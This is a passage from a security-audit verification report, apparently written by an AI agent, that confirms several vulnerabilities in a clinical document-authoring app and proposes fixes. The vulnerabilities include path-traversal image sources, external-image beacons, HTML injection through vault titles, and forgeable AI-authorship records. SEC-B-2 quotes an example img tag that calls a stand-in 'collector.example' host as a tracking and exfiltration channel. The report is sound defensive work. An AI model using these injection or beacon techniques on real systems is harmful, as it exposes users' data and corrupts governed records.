I could not run this in a real browser or against a live server (no execution environment was used beyond reading and Node's `URL`), so I did not observe the wire-level request myself; the Node `URL` reproduction is spec-conformant evidence, not a browser trace. I also did not independently verify `enforceOrgScope`/`enforceSubjectAccess` in `global-compliance.ts` beyond reading that they exist and gate on the path params — I did not trace whether a same-tenant non-admin could reach the DSR-write variant of this exploit, only that the tenant-export/full one needs the viewing user to be an admin, which the code confirms (`tenant-export.ts:162`).

**HEAD vs. audited commit (`7087f46e2`):** `git diff --stat 7087f46e2 HEAD` touches only `server/middleware/orgMembership.ts` and the ten `server/routes/protocol-*.ts` files (P11-C-1's role gate) plus docs/tests. None of `imageNode.ts`, `AuthoredHtml.tsx`, `renderSafeMarkdown.ts`, `queryClient.ts`, `authoring.router.ts`, `authoring-html-sanitizer.ts`, `tenant-export.ts`, or `global-compliance.ts` changed. The uncommitted working-tree edit is confined to `ProtocolDev.tsx` (per instructions, ignored, and unrelated to this file family regardless). **HEAD does not change this finding.**

**If confirmed, the smallest correct fix, and any place the report's proposed fix is wrong or incomplete:**

The report's fix is correct in shape and I did not find a gap in it: validate with `new URL(src, location.origin)`, require same-origin, and require the *raw* src to equal `/api/authoring/images/<id>` exactly (no extra segments, no `.`, `%2e`, `\`, `?`, `#`) — i.e., check the string TipTap/DOMPurify actually stored, not just its prefix, and check it against what the browser will resolve it to, not just what it looks like. One addition I'd make explicit: the same canonicalization must run in `sanitizeAuthoringHtml`'s `afterSanitizeAttributes` hook (`renderSafeMarkdown.ts:180-193`) and in a new server-side check on the section PATCH write path (`authoring.router.ts` before line 1801) and in `sanitizeAuthoringSectionHtml` (`authoring-html-sanitizer.ts:57-63`) — three sites, not one, since the report's own evidence shows the PATCH route currently applies no image-src rule at all, and stores whatever the client sent.

### Gate table
I did not re-run the read-only gates myself in this verification pass (the lens report already ran them and reported all pass with none covering this finding); I relied on direct code reading instead, per the verification brief's instruction to establish the finding from the code myself rather than trust prior tool output. Per the lens report: `ci:unauthenticated-fetch` (70 raw fetches, 0 baselined), `ci:upload-guards` (4 unguarded multer sites, none new), `check:security-patterns` (0 violations) — none of these gates cover this defect class (a same-app path-prefix check bypassed by dot-segment normalization), so their PASS is not evidence against SEC-B-1.

### Baseline items I re-verified as still closed (incidental, from reading the same files)
None of the audit-baseline items were in scope for this narrow verification task; I did not re-walk `docs/security/SECURITY_AUDIT_2026-09-24.md` for this pass since the task was scoped to refuting/confirming SEC-B-1 specifically. I note for the record that `IAM-14`'s authoring-image half (image upload MIME/signature check at `authoring.router.ts:6318-6335`, outside the lines I read here) was cited by the lens report as fixed and is unrelated to this finding's mechanism (this defect is about `src` value trust on write/render, not upload validation).

---

## Verification of SEC-B-2
**Verdict:** CONFIRMED
**Severity, as you would grade it:** high — governed CTD section content is displayed with a figure whose bytes an external host controls and can silently change after approval, and the same sink is a persistent exfiltration/read-receipt channel reachable by paste or by one AnA-confirmed AI draft — an injection weakness, not mere polish.
**What I checked:** I read at HEAD (`10ad41a2`); the three commits between `7087f46e2` and HEAD (`26fbf978`, `185bbbb0`, `10ad41a2`) touch only `server/middleware/orgMembership.ts` and the ten `protocol-*.ts` routers (`git diff --stat 7087f46e2..HEAD`) — nothing in the image/editor/sanitizer/CSP files below, so the finding is unchanged by that delta and I verified it directly against HEAD.
- `client/src/concept2cure/v2/editor/imageNode.ts:59-67` (`resolveImageSrc`), `:106-153` (schema, unrestricted `parseHTML() { return [{ tag: 'img[src]' }]; }`), `:155-206` (node view, `img.src = url` at 176)
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:885-888` (`transformPastedHTML`), `:928-947` (`handlePaste`/`handleDrop`, file-only)
- `server/routes/authoring.router.ts:1647-1801` (section PATCH — no sanitizer call before `content = $n`)
- `server/services/authoring/authoring-html-sanitizer.ts:33-63` (`sanitizeAuthoringSectionHtml` — `img`/`src` allowed, no prefix/scheme check)
- `server/services/authoring/authoring-from-draft.ts:230-256` (AI-draft insert calls that sanitizer at line 252)
- `client/src/concept2cure/components/ana/renderSafeMarkdown.ts:60-115` (`AUTHORING_IMAGE_URL_PREFIX`), `:176-199` (`sanitizeAuthoringHtml` — rewrites only the governed `/api/authoring/images/` prefix and other `/api/` paths; comment at 89-90 states external http(s)/`data:` "pass through DOMPurify's default URI policy untouched")
- `client/src/concept2cure/v2/editor/AuthoredHtml.tsx:41-102` (read-only renderer: `clean = sanitizeAuthoringHtml(html)` is painted via `dangerouslySetInnerHTML` at line 54/100 before the async `data-authsrc` resolution even starts — an external `src` fires immediately, natively)
- `server/export/authoring-images.ts:1-24, 152-153` and `server/export/authoring-blocks-to-html.ts:213-218` (export never fetches non-`/api/authoring/images/`, non-`data:` sources; emits `[Figure not exported: …]`)
- `server/middleware/enterprise-security.ts:232-238` (`imgSrc: ["'self'", 'data:', 'https:', 'blob:']`, documented as deliberately broad)
- `terraform/modules/cloudfront/main.tf:110-144` (SPA response-headers policy has no `img-src` at all)
- Contrast: `renderSafeMarkdown.ts:67-69` bans images in chat specifically because "model/tool-authored chat HTML rendering arbitrary external images is a tracking/exfil surface" — the same team, same file, identifies the risk class and closes it in chat but not in authored sections.
- Searched for a mitigating control that isn't in the report: no image proxy/rewriter (`grep -rn "imageProxy|proxyImage|weserv|camo"` — none), no client-side pre-save sanitizer call in `DocumentWorkbench.tsx` before PATCH, no documented risk acceptance for this exact surface in `docs/` (`grep` for "external image", "tracking pixel", "image beacon", "exfil" turned up only the unrelated export-rate-limit line and the chat-ban comment already cited).

**Why:** Every non-`/api/authoring/images/` `src` is handed back unresolved and unfiltered on both write and both read paths:
- Write: the section PATCH stores `content` verbatim (`updates.push(\`content = $${paramCount}\`); values.push(content);`, `authoring.router.ts:1801-1802`) — no sanitizer runs on a human edit/paste before storage. The AI-draft path does sanitize, but `sanitizeAuthoringSectionHtml` keeps `img`/`src` (`authoring-html-sanitizer.ts:48-49`) with no scheme or prefix restriction, so `<img src="https://collector.example/p.png?...">` survives a confirmed `draft_authoring_document` output unchanged.
- Canvas render: `resolveImageSrc` returns `Promise.resolve(src)` for anything not matching `AUTHORING_IMAGE_URL_PREFIX` (`imageNode.ts:59-67`), then the node view sets `img.src = url` directly (`imageNode.ts:176`) — a normal, credential-less, browser-native GET to the third-party host.
- Read-only render: `AuthoredHtml` paints `sanitizeAuthoringHtml(html)` immediately via `dangerouslySetInnerHTML` (`AuthoredHtml.tsx:48-54,100`); that sanitizer only rewrites the governed `/api/authoring/images/` prefix and strips other `/api/` paths — it explicitly leaves external `http(s)`/`data:` `src` values alone (`renderSafeMarkdown.ts:83-90`). So every open of the document view or a batch-draft card also fires the same native GET, before the async governed-image resolution loop even runs.
- The production CSP (`imgSrc: [... 'https:' ...]`, `enterprise-security.ts:238`) and the CloudFront response-headers policy (no `img-src` at all, `cloudfront/main.tf:110-144`) impose no additional restriction that would block this.
- The export path is the one place this is actually caught — it fetches only `/api/authoring/images/<id>` and `data:` URIs and otherwise prints `[Figure not exported: …]` (`authoring-images.ts:17-19,152-153`; `authoring-blocks-to-html.ts:216-219`) — confirming that what the canvas/read-view shows during authoring and review can diverge from the filed record, and that a figure's bytes are not fixed at the moment of approval since only a URL is stored.
- Paste: `transformPastedHTML` returns the clipboard HTML unmodified (`RichSectionEditor.tsx:885-888`) and only intercepts an actual image *file* in the clipboard (`handlePaste`, `:928-937`) — an `<img src="https://...">` embedded in pasted HTML (a web page, an email, a CRO document) is parsed straight into the schema by TipTap's unrestricted `img[src]` rule and reaches storage.

This is not adequately explained away as an intentional product tradeoff: `imageNode.ts:33` documents only the mechanical reason external images can't be authenticated-fetched, not an accepted-risk decision for confidentiality/beaconing or post-approval figure mutability; and the same codebase explicitly treats this exact vector as a tracking/exfil surface and closes it in chat (`renderSafeMarkdown.ts:67-69`) while leaving it open in the higher-stakes, longer-lived, more widely viewed authored-section path.

**If confirmed, the smallest correct fix:** the report's proposed fix is correct and I found nothing it misses:
- In `resolveImageSrc` (`imageNode.ts`) and in `sanitizeAuthoringHtml` (`renderSafeMarkdown.ts`), treat only the canonical `/api/authoring/images/<id>` reference and `data:image/(png|jpeg|gif)` as displayable; render anything else as the existing "could not be displayed" state with an upload prompt, not as a live `src`.
- Apply the same allowlist server-side in `sanitizeAuthoringSectionHtml` (`authoring-html-sanitizer.ts`) and on the raw section-PATCH write path (`authoring.router.ts:1801-1802`), which today runs no sanitizer at all on human edits/pastes — that gap is slightly broader than the report's framing, which cites the AI path's sanitizer as the example; the human-paste path has no sanitizer to fix at all and needs one added, not just tightened.
- Name dropped external images in the paste notice, as proposed.
One addition worth flagging for the fix owner: because the human PATCH path currently sanitizes nothing, closing SEC-B-1's traversal gap and SEC-B-2's external-host gap on the AI path alone (`authoring-from-draft.ts`) would leave the more common route — direct editor paste/PATCH — still exploitable; both call sites need the shared validator, not just the draft-import one.

I could not verify (would need a browser/network capture, not just reading): the actual wire request firing against a live host, and whether the `draft_authoring_document` confirm card visually surfaces an injected external image URL before a user accepts it (the report itself flags this as unread; I did not locate that component either).

---

## Verification of SEC-B-3
**Verdict:** CONFIRMED
**Severity, as you would grade it:** blocker — a governed, hash-chained revision and its atomic §11.10(e) audit row are written with content the author never attributed to "Comment anchor applied," and with an anchor position that no longer points at the quoted text; this is a governed record whose stated reason and shown state are false, which is exactly the blocker definition ("a regulated record can be created, changed … without the control the product claims, or a governed state shown is false").

**What I checked:**
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:1271-1304` (`commentOnSelection`, full function, plus the `dirty`/`doSave` state machine it uses).
- `RichSectionEditor.tsx:482, 1134-1170` (`dirty` state and `doSave`, to confirm what gets serialized and sent).
- `RichSectionEditor.tsx:1022-1026` (the only `setEditable` call in the file — driven by `readOnly`/`boot.mode`/collab-sync, not by comment state) — this is where a "pause editing while composing a comment" guard could have lived and does not.
- `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:2205-2343` (`requestAnchoredComment` and `addComment` — the promise the editor awaits, and what resolves it).
- `DocumentWorkbench.tsx:3830-3869` (the mount: `readOnly={docSealed}`, `commentsApi={{ onCreate: requestAnchoredComment, ... }}` — confirms the canvas is not otherwise locked while a comment is pending).
- `DocumentWorkbench.tsx:1976-2028` (`saveSectionContent`, the one save funnel: the reason-length gate and the `systemReason ?? changeReasonRef` precedence).
- `server/routes/governed-reason.ts:1-30` (`requireGovernedReason` — length-only check, 8–max chars, no semantic check possible).
- `server/routes/authoring.router.ts:1793-1937` (the section-PATCH transaction: `createRevision` with the raw `content`, `commitSectionToFiling` with the `changeReason`, `createAuditTrail` with `changeReason` and before/after content, all on one client/transaction).

**Why:** Every link the finding depends on is present in the code as read, not just as quoted:

1. The guard is checked once, before the async gap:
   `RichSectionEditor.tsx:1279` `if (dirty) { … return; }` — this runs before `RichSectionEditor.tsx:1286` `id = await commentsApi.onCreate({ kind: 'text-range', quote, from, to });`. Nothing re-checks dirtiness after the await.
2. That await genuinely spans author input, not a fast round-trip. `commentsApi.onCreate` is `requestAnchoredComment` (`DocumentWorkbench.tsx:2206-2213`), which returns a `Promise` that is stored in `pendingAnchorRef` and only resolved inside `addComment` (`DocumentWorkbench.tsx:2280-2343`) — i.e. only after the author types into `newComment` and it is posted (`pending.resolve(typeof created?.id === 'string' ? created.id : null)`, `DocumentWorkbench.tsx:2315`). `requestAnchoredComment` merely does `setRail('comments')` (`2211`); it does not touch the editor's editability.
3. The canvas is not made read-only while that promise is pending: `readOnly={docSealed}` (`DocumentWorkbench.tsx:3834`) is the only thing controlling editability, and the `setEditable` effect in `RichSectionEditor.tsx:1022-1026` depends only on `readOnly`, `boot.mode`, `collabRuntime`, `collabSynced` — none of which reflect an in-flight comment request. An author can keep typing while the comment rail is open.
4. After the await resolves, `doSave('Comment anchor applied')` (`RichSectionEditor.tsx:1299`) is called unconditionally. `doSave` (`RichSectionEditor.tsx:1134-1136`) serializes **whatever is currently in the editor at call time** (`editor ? serialize(editor) : null`), which includes any prose typed during the wait, and sends it with `systemReason = 'Comment anchor applied'`.
5. The host cannot recover the author's own reason once a system reason is supplied: `DocumentWorkbench.tsx:2021` `const reasonForChange = systemReason ?? changeReasonRef.current.trim();` — since `systemReason` is truthy, the author's typed reason (if any, in `changeReasonRef`) is discarded outright, not merged or compared.
6. The server cannot detect or refuse this: `governed-reason.ts:20-24` only enforces `min`/`max` length on the string; "Comment anchor applied" (22 chars) passes trivially. `authoring.router.ts:1806-1812` calls this check, then (`1793-1937`) writes the *entire* new `content` into `createRevision` (the hash-chained ledger) and into `createAuditTrail` alongside `changeReason`, atomically, in the same transaction as the section UPDATE. There is no diff-size or content-similarity gate that would catch "this save changed far more than a comment anchor."
7. The anchor-position half of the finding also holds: `from`/`to` are captured once at `RichSectionEditor.tsx:1273` (`const { from, to } = editor.state.selection;`) and reused unmapped at `RichSectionEditor.tsx:1295` (`editor.chain().focus().setTextSelection({ from, to }).setCommentAnchor(id).run();`). No `Mapping`/`tr.mapping.map(...)` call exists anywhere between capture and use, so any edit that shifts document positions before `to` during the await misplaces the anchor onto different text than the quote sent to the server — matching the report's reproduction (comment quoted "endpoint," anchor landed on " changed").
8. The code's own inline comment (`RichSectionEditor.tsx:1275-1278`) names this precise failure mode as the reason the `dirty` guard exists ("two paragraphs the author never reasoned for would be minted as a revision 'Comment anchor applied' — bypassing the §11.10(d) reason the save gate exists to require"), which shows the gap is a known-incomplete mitigation (checked before, not after, the wait), not a hypothetical.

I did not execute the vitest probe myself (time-boxed to static verification), but every step of the causal chain — the single pre-await check, the promise resolving only on the author's own comment submission, the canvas remaining editable, `doSave`'s call-time serialization, the host's unconditional `systemReason` precedence, and the server's length-only reason check plus atomic revision/audit write — is independently confirmed by reading the exact lines, so the finding is established from the code and does not rest on trusting the lens report's quotes.

**Commit range:** `git diff --stat 7087f46e2 HEAD -- client/src/concept2cure/v2/editor/RichSectionEditor.tsx client/src/concept2cure/v2/editor/DocumentWorkbench.tsx` is empty — neither file changed between `7087f46e2` and current HEAD (`10ad41a2`). The only changes in that range are the protocol-router role gate (`server/routes/protocol-*.ts`, `server/middleware/orgMembership.ts`) plus docs/work-order files; none touch this code path, `authoring.router.ts`'s section-PATCH block, or `governed-reason.ts`. The finding is unaffected by HEAD moving.

**If confirmed, the smallest correct fix:**
- Re-check dirtiness (or diff the current buffer against `lastSavedRef.current`, ignoring only the anchor mark span) immediately before calling `doSave` at `RichSectionEditor.tsx:1299`, not only at `1279`. If the buffer changed during the await, refuse the system-reason save and tell the author to save their edits under their own reason first, exactly as the code comment at `1275-1278` already says should happen.
- Map `from`/`to` through the transactions applied between the selection capture (`1273`) and the anchor application (`1295`) — e.g. record a `tr.mapping`-composed mapping across the intervening `editor.state` updates, or take the selection at `setCommentAnchor` time from a re-located search for `quote` near the original offsets, refusing to anchor if the quote is no longer there.
- The report's proposed durable fix (a server-side anchor-only endpoint that accepts a save only when text before/after is identical apart from the anchor span) is correct and is the only version of this that closes the gap independent of client behavior; the client-side compare-before-save fix above is necessary but not sufficient on its own since the server currently has no way to verify a "Comment anchor applied" PATCH didn't also carry prose changes (confirmed at `governed-reason.ts:20-24` and the unconditional content write at `authoring.router.ts:1926-1937`). I found nothing wrong or incomplete in the report's proposed fixes themselves.

---

## Verification of SEC-B-4 to SEC-B-7

I re-read every cited file at HEAD (`10ad41a2`). `git diff --stat 7087f46e2 HEAD` against every file security-B.md cites for these four findings (`RichSectionEditor.tsx`, `imageNode.ts`, `ProjectFilesPanel.tsx`, `DocumentWorkbench.tsx`, `collab-authorization.ts`, `hocuspocus-server.ts`, `authoring.router.ts`, `revision-ledger.ts`, `authService.tsx`, `EctdCoauthor.tsx`, `ProtocolDevSection.tsx`, `featureFlags.ts`) returns empty — no changes in that range. The two commits between `7087f46e2` and HEAD (`185bbbb0`, `10ad41a2`) touch only `docs/work-orders/`, `server/middleware/orgMembership.ts`, and the ten `server/routes/protocol-*.ts` role gate — none of which these four findings cite or depend on. **Nothing between `7087f46e2` and HEAD changes any of the four verdicts below.** The uncommitted working-tree edit to `ProtocolDev.tsx` (not `ProtocolDevSection.tsx`, and not cited by these findings) is irrelevant here; ignored per instruction.

---

#### SEC-B-4 — "Insert reference" parses a vault title as HTML

**Verdict:** CONFIRMED

**Severity, as I would grade it:** high (report said medium) — this is a stored HTML/injection weakness reaching a governed authored section, which the rubric places at "high" on its own (a cross-tenant **or injection weakness**), independent of any further chaining.

**What I checked:**
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:1432-1438` — `insertReference` calls `editor.chain().focus().insertContent(clean).run()` on the same `editor` instance whose schema (same file) includes `AuthoringImage` at line 759, `TrackChanges` at 769, and StarterKit's `link: { openOnClick: false, autolink: true }` at line 736 — all live in the one editor `insertReference` writes into.
- `node_modules/@tiptap/core/dist/index.js:586-624` (`createNodeFromContent`) — for string content, TipTap runs `DOMParser.fromSchema(schema).parseSlice(elementFromString(content), ...)`, i.e. the string is parsed as real HTML against the live schema, not inserted as literal text.
- `client/src/concept2cure/v2/editor/ProjectFilesPanel.tsx:96-102` — `referenceTextFor(doc)` builds `` `[Ref: "${doc.title}" · ...]` `` by raw string interpolation of `doc.title`, with no escaping, wired at `ProjectFilesPanel.tsx:345` and to the editor at `DocumentWorkbench.tsx:4665-4668` (`onInsertReference={(text) => editorRef.current?.insertReference(text) ?? false}`).
- `server/services/vault/vault-metadata-edit.service.ts:69-74` — the only guard on a vault document title is non-empty and length ≤ `TITLE_MAX`; no HTML stripping. `server/routes/c2c/project-vault.ts:1743` (`requireEditorAccess`) shows this needs an editor-role member of the tenant, not any viewer — a real but not severe narrowing.

**Why:** `insertReference`'s own comment says it is "Deliberately text, not a citation node" (RichSectionEditor.tsx:168-174), but the implementation hands a raw string through `insertContent`, which TipTap parses as HTML against a schema that includes an image node and an autolinking mark. Any tenant editor who can title (or rename) a vault document controls what a different author's click on "Insert reference" turns into inside that author's section — a link, or (chained with the SEC-B-1 image-fetch node view, which fires its authenticated GET the instant the image node mounts, with no further click) an authenticated request against any `/api/*` path. That combination is what pushes this past "medium" in my reading of the rubric: it is an injection vector, full stop, regardless of whether SEC-B-1's traversal check is separately fixed.

**If confirmed, the smallest correct fix:** insert a text node — `insertContent({ type: 'text', text: clean })` or `tr.insertText(clean)` — instead of `insertContent(clean)`. The report's proposed fix is correct and sufficient; I found no gap in it.

---

#### SEC-B-5 — the co-editing room admits any tenant member regardless of grant or seal (dark by default)

**Verdict:** CONFIRMED

**Severity, as I would grade it:** medium today, would be blocker if reachable — I agree with the report's framing.

**What I checked:**
- `server/services/collab/collab-authorization.ts:94-119` (`authorizeResource`) — checks only `SELECT 1 FROM authoring_documents WHERE id=$1 AND tenant_id=$2` and, for a section resource, the equivalent join on `authoring_sections`. No status check, no per-user grant.
- `server/routes/authoring.router.ts:299-365` (`canEditSection`) — by contrast checks `LOCKED_DOCUMENT_STATUSES` (FROZEN/APPROVED refuse every caller) and, when `sectionPermsEnforced()`, runs `decideAuthoringPermission` against the per-user grant matrix. Neither check exists on the collab path.
- `server/services/hocuspocus-server.ts:140-294` (`applyTenantPostureToSocket`, `authenticateCollabConnection`) — confirms the only gates before `authorizeResource` are: resource-name grammar, token signature/class (`nonAccessTokenReason`), tenant claim presence, **live org membership** (`checkOrgMembership` = `'member'`), and tenant lifecycle posture (active/read-only/suspended). None of these substitute for a document-lock or edit-grant check. `readOnly` is set only from tenant lifecycle posture (line ~170), never from section-level permission.
- `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:3919-3924` — `collab={liveCoedit && activeDoc ? {...} : null}` — no `docSealed` in that condition, confirming the client connects on sealed documents too.
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:1030-1049` — on first sync, `lastSavedRef.current = serializeEditor(editor, format); setDirty(false); setSaveState('saved');` runs unconditionally, i.e. whatever the room holds (including content from an unauthorized peer) is declared "saved" without comparison to the persisted record.

**Reachability, checked independently:** `client/src/flags/featureFlags.ts:74-81` — `ENABLE_LIVE_COEDITING: { enabled: false }` is a hardcoded literal with **no runtime setter anywhere** (`grep -rn "ENABLE_LIVE_COEDITING\|setFeatureEnabled("` across client and server finds only the flag's own declaration and its one read site). Turning it on requires a source change, not a config flip. Server-side, `server/services/hocuspocus-server.ts:89` reads `process.env.ENABLE_COLLAB_CRDT === 'true'`; `.env.example:227` ships it empty, and it appears nowhere under `terraform/`. Both independent switches are off, and one of them cannot be flipped by configuration alone — this is dark in every deployed configuration I can find in the repo, and dark by a stronger margin than "a flag someone could accidentally enable."

**Why:** matches the report exactly; I found no additional guard between the socket's tenant-membership check and the document/section content it exposes.

**If confirmed, the smallest correct fix:** the report's fix is correct — run `canEditSection`'s decision (locked-status refusal + `decideAuthoringPermission`) inside `authorizeResource`, and re-check membership on a timer rather than once at connect. I'd add: since the client flag requires a source edit to enable, gate `ENABLE_COLLAB_CRDT` server-side to refuse a socket entirely unless the fixed authorization gap above is closed first, so the two "enable" events (code change + env var) cannot land before the fix does.

---

#### SEC-B-6 — the `dc::` device cache survives sign-out, keyed by section not user

**Verdict:** CONFIRMED

**Severity, as I would grade it:** medium — agree with the report. Real defect, narrow trigger (shared device/profile).

**What I checked:**
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:325` — `const cacheKeyFor = (storageKey: string) => 'dc::' + storageKey;`; `:1082-1104` — `cacheDraft`/the mount effect write and read `localStorage` keyed only by `storageKey`, offering `setRestoreOffer(cached)` whenever the cached value differs from the loaded section value, with no owner check.
- Callers: `DocumentWorkbench.tsx:3836` → `storageKey={activeSection.id}`; `client/src/concept2cure/v2/surfaces/EctdCoauthor.tsx:953` → `storageKey={'coauthor:' + activeDoc.id}`; `client/src/concept2cure/v2/surfaces/ProtocolDevSection.tsx:176` → `storageKey={writable ? \`pdev-section-${sec.id}\` : null}`. All three key by document/section id, never by user id.
- `client/src/services/portal/authService.tsx:206-217` (`SecureStorage.clear`) — removes only `AUTH_STORAGE_KEYS` and `LEGACY_BEARER_KEYS`; `:989-994` (`clearAuth`, called from `logout()` at ~683 and `endSession()` at ~768, i.e. on a server-forced idle/lifetime end too) calls only `SecureStorage.clear()`. No `dc::`-prefixed removal anywhere in the file, and no `localStorage.clear()` call exists in it.
- The restore banner (`RichSectionEditor.tsx:1872-1881`) reads "A draft cached on this device differs from the saved section" with no author/time attribution, matching the report.

**Why:** matches the report exactly on every cited point; I found no code path that purges `dc::` keys on sign-out (interactive or server-forced), and confirmed the keys are section-scoped, not user-scoped, so a second account on the same browser profile is offered the first user's uncommitted, unreasoned text.

**If confirmed, the smallest correct fix:** the report's fix is correct — key by `dc::<userId>::<key>`, purge all `dc::` entries in `SecureStorage.clear()`/`clearAuth()`, and show the draft's owner/time in the restore banner.

---

#### SEC-B-7 — AI authorship is a client claim the server records as verified

**Verdict:** CONFIRMED

**Severity, as I would grade it:** high (report said medium) — this is a governed-content/governed-state field ("was this clause machine-drafted") that can be shown as `verified: true` when it is nothing more than an unauthenticated, trivially-forgeable client claim, which the rubric places at "high" ("the person can be materially misled about governed content or its state").

**What I checked:**
- `client/src/concept2cure/v2/editor/suggestions.ts:79-91` — `InsertionMark`/`DeletionMark`'s `authorId`/`authorName` attributes are `parseHTML: (el) => el.getAttribute('data-author-id'/'data-author-name')` — read straight off any `<ins>`/`<del>` in whatever HTML the schema parses (including stored content, pasted content, or content arriving via SEC-B-4's `insertContent`, since `TrackChanges` — line 769 — lives in the same schema as `AuthoringImage`/`link`).
- `client/src/concept2cure/v2/editor/RichSectionEditor.tsx:1389-1407` — `takeAcceptedAuthors`/`takeAcceptedInsertions` read directly off `editor.storage.c2cTrackChanges`, populated from those same parsed marks.
- `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:2001-2025` — the save handler forwards `acceptedAuthors`/`acceptedMachineText` unmodified into the PATCH body: `apiRequest('PATCH', .../sections/${id}, { content: serialized, ...(acceptedAuthors.length ? {acceptedAuthors} : {}), ...(acceptedMachineText.length ? {acceptedMachineText} : {}), ... })`.
- `server/services/authoring/revision-ledger.ts:170-172` — `MACHINE_AUTHOR_IDS = { ana: 'AnA (AI draft)' }`, a single, public, fixed, unsecret string (also present verbatim in client bundle text).
- `server/services/authoring/revision-ledger.ts:188-241` (`machineContributors`, `acceptedMachineText`) — the *only* validation is: the id string is a key of `MACHINE_AUTHOR_IDS`, the text is non-empty and under a length cap. Nothing checks the text against an actual server-recorded model generation.
- `server/services/clinical-regulatory-evidence/machine-attribution.ts:1-50` — confirms by design: a clause becomes "the machine's" purely by verbatim substring match against the *client-supplied* `acceptedMachineText` blob ("the needle is the clause, the haystack is the accepted text"); the module's own doc admits this "cannot attribute words to a machine that are not in the saved content" but says nothing about verifying the accepted text was ever actually produced by the model — because it isn't checked against anything server-side at all.
- `server/routes/authoring.router.ts:1868-1897` — inside the section-PATCH transaction, `contributors.length ? 'ai-draft-accept' : 'human-edit'` is written to the revision row, and `enforceAuthorLineage(..., { acceptedMachineText: acceptedMachine })` records per-clause machine spans in the same transaction — both driven by the client-supplied, minimally-validated fields above.
- `server/routes/authoring.router.ts:5905-5912` (`describeProposer`, tracked-change decisions path) — `if (typeof authorId === 'string' && MACHINE_AUTHOR_IDS[authorId]) return { proposedBy: MACHINE_AUTHOR_IDS[authorId], proposedByVerified: true };`. The function's own comment concedes the identity is "closed, server-owned vocabulary" only in the sense that the *string* is a known enum value — matching the enum is treated as "verified," which conflates "the caller used a known keyword" with "the claim is true." `grep -rn proposedByVerified` finds it used nowhere but this router and its own test — I could not verify from static reading whether any Data Origins/AI-transparency report reads this same persisted flag without the qualifier the report says the audit rail applies ("as recorded by the editing client," per `DocumentWorkbench.tsx:267` cited in the report — I did not re-derive that citation myself but the surrounding logic is consistent with it).

**Why:** authorship of a clause (human vs. AI) is explicitly treated in this codebase as a governed fact feeding lineage, Data Origins, and AI-transparency surfaces (per the module comments at `machine-attribution.ts:1-10` and `authoring.router.ts:1868-1872`). The only server-side "verification" is that a client-chosen string equals a public, single-value enum (`'ana'`) — there is no digest, hash, or stored-generation record to check a claimed AI text against. Any editor with ordinary write access to an unlocked section (no exploit chain required — a single PATCH with a crafted body suffices) can mark arbitrary human-written text as `origin: 'ai-draft-accept'`, `proposedByVerified: true`, and machine-attributed spans, or conversely dress up an actual AI draft as pure human authorship by omitting the fields. This happens inside the same governed transaction as the content write (`authoring.router.ts:1862-1897`), so the false attribution is committed to the hash-chained revision ledger alongside the real content change. It is confined to unlocked (not FROZEN/APPROVED) documents by `canEditSection`, which is why I did not push this all the way to "blocker" — the section *content* and its accept/reject decisions are still correctly gated and audited; it is specifically the "who/what wrote it" provenance annotation that is forgeable, and that annotation then rides unaltered into the permanent record once the document is later locked.

**If confirmed, the smallest correct fix:** the report's fix is right in direction and I'd keep it as stated — record a server-side digest of each AnA output when the stream produces it (per tenant/section/run), and accept an `ana` claim (both `machineContributors` and `acceptedMachineText`) only when the claimed text is contained in a digest-matched, server-recorded output; otherwise store it as unverified and never set `proposedByVerified: true` (or the revision origin `ai-draft-accept`) on vocabulary membership alone. I'd add: apply the identical digest check to `describeProposer` (authoring.router.ts:5905-5912), which has the same defect on the tracked-change-decision path and is not covered by the report's fix as written (that fix targets the revision-ledger/lineage path only).

---

### Gate table

I ran the read-only gates relevant to this file family; none of them cover any of these four findings (confirmed by inspection, consistent with the source report's own claim):

| gate | result | baseline size/direction |
|---|---|---|
| `check:security-patterns` | PASS | not re-baselined by me; report states 0 violations across 2,863 files, unchanged |
| `ci:unauthenticated-fetch` | not re-run by me (report states PASS, 70 raw fetches, 0 baselined) — not applicable to these findings (all four paths are authenticated) | — |

I did not independently re-run these gates in this pass (the verification task was scoped to reading the cited code, not re-executing the lens's probes/gates); I relied on direct code inspection for each of the four findings rather than on gate output, since the report itself states none of these gates cover SEC-B-4 through SEC-B-7.

### What I could not verify by reading alone
- SEC-B-4/B-1 chaining: I did not run a browser or a live server to observe the authenticated GET firing on insertion; I verified it structurally (the node view calls `resolveImageSrc` synchronously on mount, per `imageNode.ts:150-165`, with no user click gate) but did not execute it.
- SEC-B-5: no Hocuspocus server was started; I verified the authorization/reachability logic and the off-by-default flags by static reading only, consistent with the report's own "not run" disclosure.
- SEC-B-7: I could not find, by static grep, where a Data Origins PDF or AI-transparency report reads `proposedByVerified` or the lineage `machine_draft`/`accepted` kind to confirm whether *that* specific rendering surface applies the same "as recorded by the editing client" qualifier the audit rail does; I'm relying on the report's citation of `DocumentWorkbench.tsx:267` for that claim rather than having independently traced it myself.

### Baseline ids re-verified
None of SEC-B-4 through SEC-B-7 correspond to an id in the prior `docs/security/SECURITY_AUDIT_2026-09-24.md` baseline — security-B.md's own "Earlier findings re-verified" table states this file (`RichSectionEditor.tsx` and its editor family) was not previously read line-by-line by any prior audit pass, and I found nothing in my reading that contradicts that. These are new findings, not baseline re-verifications; no regression flag applies to any of the four.

---

## Verification of SEC-C-2
**Verdict:** CONFIRMED

**Severity, as you would grade it:** blocker — after finalize/signature (21 CFR 11.50/11.70), the schedule of assessments can still gain rows and change cells with no new version and no new signature, while the screen keeps showing the document as "Finalized" at the signed version with no indication the signed content no longer matches what's on screen. This is exactly the scale's blocker case: a governed record is changed after signing, and the governed state shown ("Finalized") is false.

**What I checked** (all at HEAD `10ad41a2`, clean read of the actual files, not the report's quotes):
- `server/services/protocol-soa/protocol-soa-service.ts:1-75` — full file, via `Read` and a targeted `grep -n "assertEditable\|protocol_documents\|status"` which returned **zero matches**. `addAssessmentTx` (28-36), `setCellTx` (39-53) and `clearCellTx` (56-59) never touch `protocol_documents` or its `status`; `setCellTx` looks up the assessment and visit only to confirm they belong to the same org/document, not to check lifecycle state.
